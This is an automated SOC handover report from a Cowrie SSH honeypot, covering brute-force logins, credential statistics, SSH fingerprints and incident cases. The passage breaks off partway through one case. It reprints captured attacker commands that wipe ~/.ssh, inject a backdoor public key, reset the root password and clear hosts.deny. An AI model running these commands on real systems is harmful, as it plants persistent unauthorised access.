# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-10 |
| **Generated At** | 2026-04-10T16:49:03Z |
| **Shift Time** | 16:49 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **203** |
| Confirmed Threats | **197** |
| False Positives Filtered | **6** (3.0%) |
| Unique Attacker IPs | **18** |
| Countries of Origin | **9** |
| High Severity Cases | **78** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **125** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **159** |
| Unique Credential Pairs | **81** |
| Unique Usernames | **31** |
| Unique Passwords | **81** |
| Successful Auth Pairs | **49** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 78 |
| `345gs5662d34` | 36 |
| `ubuntu` | 6 |
| `vpn` | 3 |
| `test` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 38 |
| `345gs5662d34` | 36 |
| `qwer1` | 2 |
| `frappe23!` | 2 |
| `1234` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 38 |
| `345gs5662d34` | `345gs5662d34` | 36 |
| `root` | `qwer1` | 2 |
| `deploy` | `frappe23!` | 2 |
| `storage` | `1234` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Azerty2025` | `179.57.170.71` | 2026-04-10T14:46:01 |
| `root` | `3245gs5662d34` | `179.57.170.71` | 2026-04-10T14:46:09 |
| `root` | `ass` | `179.57.170.71` | 2026-04-10T14:53:26 |
| `root` | `Guest123!` | `179.57.170.71` | 2026-04-10T14:55:28 |
| `root` | `ngf1r3wall` | `111.228.6.161` | 2026-04-10T15:00:46 |
| `root` | `3245gs5662d34` | `111.228.6.161` | 2026-04-10T15:01:00 |
| `root` | `Hn123456` | `179.57.170.71` | 2026-04-10T15:01:23 |
| `root` | `ZAQ!2wsx2022` | `179.57.170.71` | 2026-04-10T15:03:16 |
| `root` | `ZAQ!2wsx54321!@#` | `179.57.170.71` | 2026-04-10T15:07:02 |
| `root` | `qwertyqwerty123` | `111.228.6.161` | 2026-04-10T15:09:46 |
| `root` | `DDxx1234` | `179.57.170.71` | 2026-04-10T15:12:55 |
| `root` | `12345.com` | `179.57.170.71` | 2026-04-10T15:14:56 |
| `root` | `admin@12` | `179.57.170.71` | 2026-04-10T15:24:33 |
| `root` | `qwer1` | `47.251.8.86` | 2026-04-10T15:29:53 |
| `root` | `alireza` | `195.250.72.168` | 2026-04-10T15:29:58 |
| `root` | `3245gs5662d34` | `47.251.8.86` | 2026-04-10T15:29:59 |
| `root` | `3245gs5662d34` | `195.250.72.168` | 2026-04-10T15:30:03 |
| `root` | `Qazwsx2019..` | `189.147.20.241` | 2026-04-10T15:30:34 |
| `root` | `3245gs5662d34` | `189.147.20.241` | 2026-04-10T15:30:40 |
| `root` | `qwer1` | `43.156.71.43` | 2026-04-10T15:34:00 |
| `root` | `3245gs5662d34` | `43.156.71.43` | 2026-04-10T15:34:02 |
| `root` | `Asdf@#` | `121.229.27.155` | 2026-04-10T15:34:36 |
| `root` | `3245gs5662d34` | `121.229.27.155` | 2026-04-10T15:34:49 |
| `root` | `1qaz2wsx3edc@#` | `121.229.27.155` | 2026-04-10T15:34:52 |
| `root` | `2024!` | `121.229.27.155` | 2026-04-10T15:35:14 |
| `root` | `Pass@321` | `121.229.27.155` | 2026-04-10T15:36:26 |
| `root` | `Qwe123Qwe456` | `14.103.111.135` | 2026-04-10T15:36:29 |
| `root` | `root2023.` | `121.229.27.155` | 2026-04-10T15:36:45 |
| `root` | `111222333` | `121.229.27.155` | 2026-04-10T15:37:50 |
| `root` | `setup123` | `121.229.27.155` | 2026-04-10T15:38:21 |
| `root` | `root123?` | `121.229.27.155` | 2026-04-10T15:39:02 |
| `root` | `123.QWER` | `43.156.71.43` | 2026-04-10T15:39:11 |
| `root` | `root123123$` | `121.229.27.155` | 2026-04-10T15:39:20 |
| `root` | `Qwe123Qwe456` | `121.229.27.155` | 2026-04-10T15:40:14 |
| `root` | `root12345..` | `187.107.88.97` | 2026-04-10T15:40:17 |
| `root` | `3245gs5662d34` | `187.107.88.97` | 2026-04-10T15:40:24 |
| `root` | `root2023.` | `14.103.111.135` | 2026-04-10T15:41:16 |
| `root` | `3245gs5662d34` | `14.103.111.135` | 2026-04-10T15:41:20 |
| `root` | `huang520` | `187.107.88.97` | 2026-04-10T15:47:02 |
| `root` | `123$qwer` | `43.156.71.43` | 2026-04-10T15:52:00 |
| `root` | `User2024` | `43.156.71.43` | 2026-04-10T15:53:46 |
| `root` | `Qwe444` | `187.107.88.97` | 2026-04-10T15:53:47 |
| `root` | `Root0.` | `43.156.71.43` | 2026-04-10T15:55:29 |
| `root` | `Qwerty2025` | `187.107.88.97` | 2026-04-10T15:57:02 |
| `root` | `Jancok123` | `43.156.71.43` | 2026-04-10T15:57:06 |
| `root` | `username` | `43.156.71.43` | 2026-04-10T16:00:36 |
| `root` | `ddQQ000` | `43.156.71.43` | 2026-04-10T16:09:06 |
| `root` | `ubuntu@2026` | `43.156.71.43` | 2026-04-10T16:10:48 |
| `root` | `P@ssw0rd#2025` | `43.156.71.43` | 2026-04-10T16:14:20 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **203** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 192 |
| Paramiko (Python) | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 183 | 11 |
| `d6729b7f2442...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 183 | 11 | Modern SSH client |
| `95420f9d932d...` | libssh | 9 | 2 | — |
| `d6729b7f2442...` | Paramiko (Python) | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 38 | 9 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:WVBy7WouNkFb"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.111.135`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `195.250.72.168`, `179.57.170.71`, `189.147.20.241`, `121.229.27.155`, `47.251.8.86`, `187.107.88.97`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `111.228.6.161`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **18** |
| Unique ASNs | **17** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | LOW |
| `AS49800` | GNC-Alfa CJSC | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |
| `AS141679` | China Telecom Beijing Tianjin Hebei Big Data Industry Park Branch | 1 | HIGH |
| `AS14117` | Telefonica del Sur S.A. | 1 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (78)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8573cd5d475e

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 14:45 |
| **Last Seen** | 2026-04-10 14:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:45:59` | `cowrie.session.connect` |
| `2026-04-10 14:45:59` | `cowrie.client.version` |
| `2026-04-10 14:45:59` | `cowrie.client.kex` |
| `2026-04-10 14:46:01` | `cowrie.login.success` |
| `2026-04-10 14:46:02` | `cowrie.session.params` |
| `2026-04-10 14:46:02` | `cowrie.command.input` |
| `2026-04-10 14:46:02` | `cowrie.command.failed` |
| `2026-04-10 14:46:02` | `cowrie.log.closed` |
| `2026-04-10 14:46:03` | `cowrie.session.params` |
| `2026-04-10 14:46:03` | `cowrie.command.input` |
| `2026-04-10 14:46:03` | `cowrie.session.file_download` |
| `2026-04-10 14:46:03` | `cowrie.log.closed` |
| `2026-04-10 14:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f30a44fd34a

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 14:46 |
| **Last Seen** | 2026-04-10 14:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:46:07` | `cowrie.session.connect` |
| `2026-04-10 14:46:07` | `cowrie.client.version` |
| `2026-04-10 14:46:07` | `cowrie.client.kex` |
| `2026-04-10 14:46:09` | `cowrie.login.success` |
| `2026-04-10 14:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e52498a4697

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 14:53 |
| **Last Seen** | 2026-04-10 14:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:53:25` | `cowrie.session.connect` |
| `2026-04-10 14:53:25` | `cowrie.client.version` |
| `2026-04-10 14:53:25` | `cowrie.client.kex` |
| `2026-04-10 14:53:26` | `cowrie.login.success` |
| `2026-04-10 14:53:27` | `cowrie.session.params` |
| `2026-04-10 14:53:27` | `cowrie.command.input` |
| `2026-04-10 14:53:27` | `cowrie.command.failed` |
| `2026-04-10 14:53:28` | `cowrie.log.closed` |
| `2026-04-10 14:53:28` | `cowrie.session.params` |
| `2026-04-10 14:53:28` | `cowrie.command.input` |
| `2026-04-10 14:53:29` | `cowrie.session.file_download` |
| `2026-04-10 14:53:29` | `cowrie.log.closed` |
| `2026-04-10 14:53:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4e96884b72b

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 14:53 |
| **Last Seen** | 2026-04-10 14:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:53:32` | `cowrie.session.connect` |
| `2026-04-10 14:53:32` | `cowrie.client.version` |
| `2026-04-10 14:53:33` | `cowrie.client.kex` |
| `2026-04-10 14:53:34` | `cowrie.login.success` |
| `2026-04-10 14:53:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-697a57d46464

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 14:55 |
| **Last Seen** | 2026-04-10 14:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:55:26` | `cowrie.session.connect` |
| `2026-04-10 14:55:26` | `cowrie.client.version` |
| `2026-04-10 14:55:27` | `cowrie.client.kex` |
| `2026-04-10 14:55:28` | `cowrie.login.success` |
| `2026-04-10 14:55:29` | `cowrie.session.params` |
| `2026-04-10 14:55:29` | `cowrie.command.input` |
| `2026-04-10 14:55:29` | `cowrie.command.failed` |
| `2026-04-10 14:55:29` | `cowrie.log.closed` |
| `2026-04-10 14:55:30` | `cowrie.session.params` |
| `2026-04-10 14:55:30` | `cowrie.command.input` |
| `2026-04-10 14:55:30` | `cowrie.session.file_download` |
| `2026-04-10 14:55:30` | `cowrie.log.closed` |
| `2026-04-10 14:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9ba9092778d

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 14:55 |
| **Last Seen** | 2026-04-10 14:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 14:55:34` | `cowrie.session.connect` |
| `2026-04-10 14:55:34` | `cowrie.client.version` |
| `2026-04-10 14:55:35` | `cowrie.client.kex` |
| `2026-04-10 14:55:36` | `cowrie.login.success` |
| `2026-04-10 14:55:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d04f2ea1512c

| Field | Detail |
|---|---|
| **Source IP** | `111.228.6[.]161` |
| **First Seen** | 2026-04-10 15:00 |
| **Last Seen** | 2026-04-10 15:01 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:00:43` | `cowrie.session.connect` |
| `2026-04-10 15:00:43` | `cowrie.client.version` |
| `2026-04-10 15:00:44` | `cowrie.client.kex` |
| `2026-04-10 15:00:46` | `cowrie.login.success` |
| `2026-04-10 15:00:49` | `cowrie.session.params` |
| `2026-04-10 15:00:49` | `cowrie.command.input` |
| `2026-04-10 15:00:49` | `cowrie.command.failed` |
| `2026-04-10 15:00:49` | `cowrie.log.closed` |
| `2026-04-10 15:00:50` | `cowrie.session.params` |
| `2026-04-10 15:00:50` | `cowrie.command.input` |
| `2026-04-10 15:00:51` | `cowrie.session.file_download` |
| `2026-04-10 15:00:51` | `cowrie.log.closed` |
| `2026-04-10 15:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.228.6[.]161` to AbuseIPDB if not already reported
- [ ] Block `111.228.6[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79a943168915

| Field | Detail |
|---|---|
| **Source IP** | `111.228.6[.]161` |
| **First Seen** | 2026-04-10 15:00 |
| **Last Seen** | 2026-04-10 15:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:00:57` | `cowrie.session.connect` |
| `2026-04-10 15:00:57` | `cowrie.client.version` |
| `2026-04-10 15:00:58` | `cowrie.client.kex` |
| `2026-04-10 15:01:00` | `cowrie.login.success` |
| `2026-04-10 15:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.228.6[.]161` to AbuseIPDB if not already reported
- [ ] Block `111.228.6[.]161` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83650fb49af9

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 15:01 |
| **Last Seen** | 2026-04-10 15:01 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:01:21` | `cowrie.session.connect` |
| `2026-04-10 15:01:21` | `cowrie.client.version` |
| `2026-04-10 15:01:21` | `cowrie.client.kex` |
| `2026-04-10 15:01:23` | `cowrie.login.success` |
| `2026-04-10 15:01:23` | `cowrie.session.params` |
| `2026-04-10 15:01:23` | `cowrie.command.input` |
| `2026-04-10 15:01:23` | `cowrie.command.failed` |
| `2026-04-10 15:01:24` | `cowrie.log.closed` |
| `2026-04-10 15:01:24` | `cowrie.session.params` |
| `2026-04-10 15:01:24` | `cowrie.command.input` |
| `2026-04-10 15:01:25` | `cowrie.session.file_download` |
| `2026-04-10 15:01:25` | `cowrie.log.closed` |
| `2026-04-10 15:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fde1bb9ff860

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 15:01 |
| **Last Seen** | 2026-04-10 15:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-10 15:01:29` | `cowrie.session.connect` |
| `2026-04-10 15:01:29` | `cowrie.client.version` |
| `2026-04-10 15:01:29` | `cowrie.client.kex` |
| `2026-04-10 15:01:30` | `cowrie.login.success` |
| `2026-04-10 15:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.57.170[.]71` to AbuseIPDB if not already reported
- [ ] Block `179.57.170[.]71` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c3fcecc2203

| Field | Detail |
|---|---|
| **Source IP** | `179.57.170[.]71` |
| **First Seen** | 2026-04-10 15:03 |
| **Last Seen** | 2026-04-10 15:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
